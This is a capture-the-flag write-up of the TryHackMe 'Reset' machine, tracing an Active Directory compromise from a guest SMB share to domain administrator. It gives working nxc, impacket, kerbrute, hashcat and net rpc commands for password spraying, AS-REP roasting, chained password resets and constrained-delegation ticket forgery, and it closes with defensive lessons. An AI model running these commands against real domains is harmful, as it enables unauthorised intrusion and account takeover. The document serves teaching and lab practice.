# Reset — TryHackMe

![](https://img.shields.io/badge/Platform-TryHackMe-darkred?style=for-the-badge&logo=tryhackme&logoColor=white)
![](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![](https://img.shields.io/badge/Category-Active_Directory%20%7C%20Kerberos%20%7C%20Delegation-orange?style=for-the-badge)

<img width="1200" height="630" alt="reset-writeup" src="https://github.com/user-attachments/assets/35eab584-8e2e-4adc-a41c-1127c80d7813" />

## Summary

Reset is a **Hard** Windows machine on TryHackMe that walks through a full Active Directory attack chain — from anonymous SMB access to Domain Administrator via Constrained Delegation abuse. A guest-accessible SMB share contains an onboarding email with a default password. RID brute-forcing reveals domain users, and password spraying identifies the matching account (`LILY_ONEILL`). AS-REP Roasting extracts crackable hashes for `TABATHA_BRITT`, whose RDP access and BloodHound enumeration reveal a lateral movement chain: `GenericAll` on `SHAWNA_BRAY` → `ForceChangePassword` on `CRUZ_HALL` → access to `DARLA_WINTERS`. DARLA has **Constrained Delegation** rights to `cifs/HayStack.thm.corp`, enabling S4U2self/S4U2proxy ticket forgery to impersonate the Domain Administrator. A forged Kerberos service ticket + `wmiexec` delivers a SYSTEM shell — after `smbexec` and `psexec` both refuse to cooperate.

```
SMB Guest Share → Onboarding Password → RID Brute → Password Spray (LILY_ONEILL)
  → AS-REP Roasting → TABATHA_BRITT → BloodHound
  → GenericAll Chain: SHAWNA_BRAY → CRUZ_HALL → DARLA_WINTERS
  → Constrained Delegation (S4U2proxy) → Administrator TGS → wmiexec (Flags)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Port scanning & AD enumeration | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| SMB guest share access | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Share Discovery](https://attack.mitre.org/techniques/T1135/) | `T1135` |
| Password from onboarding file | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) | `T1552.001` |
| RID brute-force user enumeration | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Account Discovery: Domain Account](https://attack.mitre.org/techniques/T1087/002/) | `T1087.002` |
| Password spraying | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) | `T1110.003` |
| AS-REP Roasting | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) | `T1558.004` |
| Hashcat password cracking | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Brute Force: Password Cracking](https://attack.mitre.org/techniques/T1110/002/) | `T1110.002` |
| BloodHound domain mapping | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Permission Groups Discovery: Domain Groups](https://attack.mitre.org/techniques/T1069/002/) | `T1069.002` |
| GenericAll password reset chain | [Persistence](https://attack.mitre.org/tactics/TA0003/) | [Account Manipulation](https://attack.mitre.org/techniques/T1098/) | `T1098` |
| S4U2self/S4U2proxy ticket forgery | [Credential Access](https://attack.mitre.org/tactics/TA0006/) | [Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) | `T1558` |
| Pass-the-Ticket via wmiexec | [Lateral Movement](https://attack.mitre.org/tactics/TA0008/) | [Use Alternate Authentication Material: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/) | `T1550.003` |

<img width="1728" height="2304" alt="Reset_THM" src="https://github.com/user-attachments/assets/8f7c184d-6a39-4bb3-bd4c-41c5c617fb2d" />

## Reconnaissance — `T1046` `T1135`

### Nmap

Since we're dealing with Active Directory (Windows being the notoriously shy creature that it is when it comes to ICMP), the `-Pn` flag is non-negotiable:

```bash
sudo nmap -sC -sV -v $IP -Pn
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: thm.corp, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

The full AD ensemble: DNS, Kerberos, LDAP, SMB, RPC, RDP. Domain `thm.corp`, hostname `HAYSTACK` — add both to `/etc/hosts`.

### SMB Enumeration — `T1552.001`

```bash
nxc smb $IP -u 'guest' -p ''
```

```
SMB  10.114.158.248  445  HAYSTACK  [*] Windows 10 / Server 2019 Build 17763 x64
     (name:HAYSTACK) (domain:thm.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.114.158.248  445  HAYSTACK  [+] thm.corp\guest:
```

Guest access accepted. Enumerating shares:

```bash
nxc smb $IP -u 'guest' -p '' --shares
```

```
Share      Permissions  Remark
-----      -----------  ------
ADMIN$                  Remote Admin
C$                      Default share
Data       READ,WRITE
IPC$       READ         Remote IPC
NETLOGON                Logon server share
SYSVOL                  Logon server share
```

The `Data` share stands out — **READ,WRITE** for a guest account. Connecting via `smbclient`:

<img width="1129" height="625" alt="2026-05-20_12-58" src="https://github.com/user-attachments/assets/ef4c09cf-aa4b-4bdd-b261-d5d859f99ef1" />

Three files in an `onboarding/` directory, and — interestingly — their names change periodically (some automated process is cycling them). Downloading the `.txt` file reveals an onboarding email:

```
Subject: Welcome to Reset

Dear <USER>,

Welcome aboard! We are thrilled to have you join our team.
The initial password is: ********
```

We have a password but no username. Time to build a user list.

### RID Brute-Force — `T1087.002`

Standard `--users` enumeration returns nothing, but RID cycling delivers:

```bash
nxc smb $IP -u 'guest' -p '' --rid-brute
```

<img width="1125" height="622" alt="thm_reset_smb_rid_brute" src="https://github.com/user-attachments/assets/9cd77903-19f0-47b0-a9d7-36416fc37d54" />

A full dump of domain users. The raw output needs cleaning before it's usable for spraying — `awk` handles the extraction:

```bash
awk -F'\\\\| \\(' '/SidTypeUser/ {print $2}' users.txt > users1.txt
```

This filters for `SidTypeUser` entries only, strips the domain prefix and SID suffix, and outputs clean usernames.
-F'\\\\| \\(' — tells awk that the string is split either by a backslash \ (in the THM domain) or by a space + opening parenthesis combination (.

{print $2} — prints exactly what's between them (the username).


## Initial Access — `T1110.003`

### Password Spraying

```bash
nxc smb $IP -u 'users1.txt' -p '********'
```

```
SMB  10.114.158.248  445  HAYSTACK  [+] thm.corp\LILY_ONEILL:******** (Guest)
```

`LILY_ONEILL` matches — though with Guest-level privileges only. No RDP access, nothing useful in SMB shares. We need to go deeper.

### AS-REP Roasting — `T1558.004`

First, validate the user list against Kerberos:

```bash
kerbrute userenum users1.txt -d thm.corp --dc $IP
```

Then hunt for accounts with pre-authentication disabled:

```bash
impacket-GetNPUsers thm.corp/ -no-pass \
    -usersfile users1.txt \
    -dc-ip $IP \
    -format hashcat
```

<img width="1919" height="962" alt="thm_reset_impacket_getnpusers" src="https://github.com/user-attachments/assets/587d9f0d-7ddc-46cd-b148-f7ac0400edf8" />

Three accounts cough up AS-REP hashes. Feeding them to Hashcat:

```bash
hashcat ker.txt /usr/share/wordlists/rockyou.txt
```

<img width="1128" height="638" alt="thm_reset_hashcat_kerb" src="https://github.com/user-attachments/assets/329121fa-ab89-4b04-a4bc-8555f70b46a2" />

Only one cracks: **`TABATHA_BRITT`**. Unlike LILY_ONEILL, this account has actual domain privileges — including RDP access.

## Domain Reconnaissance — `T1069.002`

### BloodHound

RDP in as TABATHA_BRITT — no flag on the desktop, nothing in user directories. Time to map the domain:

```bash
bloodhound-ce-python -d thm.corp -ns $IP \
    -dc thm.corp --zip -c all \
    -u 'TABATHA_BRITT' -p '*******'
```

<img width="1919" height="841" alt="thm_reset_bloodhound_recon" src="https://github.com/user-attachments/assets/205e0876-a747-467f-a4bd-71f4ed2f50af" />

BloodHound reveals a remarkably clean lateral movement chain:

1. **TABATHA_BRITT** → `GenericAll` → **SHAWNA_BRAY**
2. **SHAWNA_BRAY** → `ForceChangePassword` → **CRUZ_HALL**
3. **CRUZ_HALL** → access to → **DARLA_WINTERS**

And DARLA_WINTERS holds the key to the kingdom.

## Lateral Movement — `T1098`

### GenericAll Password Reset Chain

`GenericAll` grants complete control over an object — including resetting its password without knowing the current one. The chain is mechanical:

```bash
# TABATHA_BRITT resets SHAWNA_BRAY's password
net rpc password "SHAWNA_BRAY" "newP@ssword2022" \
    -U "thm.corp"/"TABATHA_BRITT"%"password" -S "thm.corp"

# SHAWNA_BRAY resets CRUZ_HALL's password
net rpc password "CRUZ_HALL" "newP@ssword2022" \
    -U "thm.corp"/"SHAWNA_BRAY"%"newP@ssword2022" -S "thm.corp"

# CRUZ_HALL → DARLA_WINTERS (same procedure)
net rpc password "DARLA_WINTERS" "newP@ssword2022" \
    -U "thm.corp"/"CRUZ_HALL"%"newP@ssword2022" -S "thm.corp"
```

Three password resets, each one stepping closer to the delegation privileges we need.

## Privilege Escalation — `T1558` `T1550.003`

### Constrained Delegation — S4U2proxy

<img width="1919" height="839" alt="thm_reset_bloodhound_constrained_delegation" src="https://github.com/user-attachments/assets/4e1eb494-3073-4343-a021-e599bcb0304f" />

BloodHound reveals the critical detail about DARLA_WINTERS:

- **Trusted For Constrained Delegation:** TRUE
- **AllowedToDelegate:** `cifs/HayStack.thm.corp`

This means DARLA_WINTERS can request Kerberos service tickets to the CIFS service (SMB) on the domain controller — **impersonating any domain user**, including Administrator. The S4U2self/S4U2proxy mechanism handles the impersonation: S4U2self obtains a forwardable ticket "on behalf of" the target user, and S4U2proxy exchanges it for a service ticket to the constrained SPN.

### Forging the Administrator Ticket

```bash
impacket-getST -spn 'cifs/haystack.thm.corp' \
    -impersonate Administrator \
    -dc-ip $IP \
    'thm.corp/DARLA_WINTERS:newP@ssword2022'
```

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2proxy
[*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

> **Critical detail:** The SPN must use the **fully qualified domain name** (`cifs/haystack.thm.corp`), not the short hostname. A ticket issued for `cifs/HAYSTACK` will generate successfully but fail at authentication — the SPN in the ticket won't match the server's expected principal name.

Import the ticket into the current session:

```bash
export KRB5CCNAME=/tmp/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

### The Execution Tool Gauntlet

With the forged ticket loaded, we need to execute commands on the DC. This turns into a process of elimination:

**smbexec** — fails:

```
[-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND
```

**psexec** — creates the service, uploads the binary, then chokes on cleanup:

```
[-] Error performing the uninstallation, cleaning up
```

**wmiexec** — works flawlessly:

```bash
impacket-wmiexec -k -no-pass -dc-ip 'thm.corp' \
    'THM.CORP/Administrator@haystack.thm.corp'
```

```
[*] SMBv3.0 dialect used
C:\>whoami
thm\administrator
```

> **Why wmiexec succeeds where others fail:** `smbexec` and `psexec` both rely on creating Windows services via the Service Control Manager — which requires writing executables to disk and managing service lifecycle. `wmiexec` operates through WMI (Windows Management Instrumentation), executing commands via `Win32_Process.Create()` without touching the filesystem or service infrastructure. It's quieter, leaves fewer forensic artifacts, and sidesteps the file-level permission issues that tripped up the other tools.

## Flags

```bash
C:\Users\Administrator\Desktop> type root.txt
THM{SOME_FLAG_ROOT_IS_HERE}

C:\Users\automate\Desktop> type user.txt
THM{USER_FLAG_IS_HERE}
```

> The intended path likely involves the `automate` user (whose desktop holds the user flag), but the Constrained Delegation chain provides a direct route to Administrator — sometimes the scenic route skips a few stops.

## Lessons Learned

1. **Guest-writable SMB shares are information hemorrhages.** The `Data` share gave anonymous users READ/WRITE access to onboarding documents containing default passwords. In production environments, guest access to non-IPC shares should be disabled entirely — `net share Data /grant:everyone,FULL` is not an access control strategy.

2. **RID brute-forcing bypasses user enumeration restrictions.** Standard `--users` queries returned nothing, but RID cycling (`--rid-brute`) dumped the complete user list. RID values are sequential and predictable — the 500 range for built-in accounts, 1000+ for domain users. This technique works even when LDAP user enumeration is locked down.

3. **AS-REP Roasting targets a single checkbox.** Any account with "Do not require Kerberos preauthentication" enabled hands its password hash to any anonymous attacker who asks. Three accounts had this misconfiguration — and one used a `rockyou.txt`-crackable password. The fix is trivial: ensure pre-authentication is required for every domain account.

4. **GenericAll ACLs are password reset chains in disguise.** Each `GenericAll` permission in the BloodHound graph translates to a single `net rpc password` command. Three resets, three pivots, zero exploitation — just misconfigured ACLs doing exactly what they're configured to do.

5. **Constrained Delegation SPN formatting is unforgiving.** The S4U2proxy ticket must target the exact SPN as configured in AD — `cifs/haystack.thm.corp`, not `cifs/HAYSTACK`. A mismatched SPN generates a valid-looking ticket that silently fails at authentication. For a detailed technical reference, see this excellent [Constrained Delegation deep-dive](https://blog.deephacking.tech/en/posts/constrained-delegation-y-resource-based-constrained-delegation/).

6. **When in doubt, try `wmiexec`.** The Impacket execution tools (`smbexec`, `psexec`, `wmiexec`) each use different Windows subsystems. When one fails with cryptic errors, the others may succeed — `wmiexec` in particular avoids filesystem and service-related failure modes that plague the other two.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
